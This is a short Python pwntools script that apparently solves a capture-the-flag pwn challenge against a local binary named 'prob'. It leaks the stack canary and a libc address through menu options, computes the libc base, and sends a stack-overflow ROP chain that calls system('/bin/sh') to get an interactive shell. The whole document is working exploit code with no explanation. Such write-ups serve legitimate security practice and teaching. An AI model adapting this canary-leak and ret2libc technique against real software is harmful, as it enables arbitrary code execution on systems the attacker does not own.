from pwn import *

p = process("./prob")
e = ELF("./prob")
libc = ELF("./libc.so.6")

# gdb.attach(p)

p.sendlineafter(b'name:', b'payload')

p.sendlineafter(b'Choose an action: ',str('16').encode())

p.recvuntil(b'an ')

cnry = int(p.recvuntil(b' ').strip())

print("Canary : "  +hex(cnry))

p.sendlineafter(b'Choose an action: ',str('18').encode())

p.recvuntil(b'an ')

libc_start = int(p.recvuntil(b' ').strip())

libc_base = libc_start - 0x29d90
print("libc_base : " + hex(libc_base))


system = libc_base + libc.symbols['system']
binsh = libc_base + 0x1d8678
pop_rdi = libc_base + 0x000000000002a3e5
ret = libc_base + 0x0000000000029139

payload = b'a' * 0x20 + p64(cnry) + p64(0)
payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)

p.sendlineafter(b'Choose an action: ',str('0').encode())

p.send(payload)

p.interactive()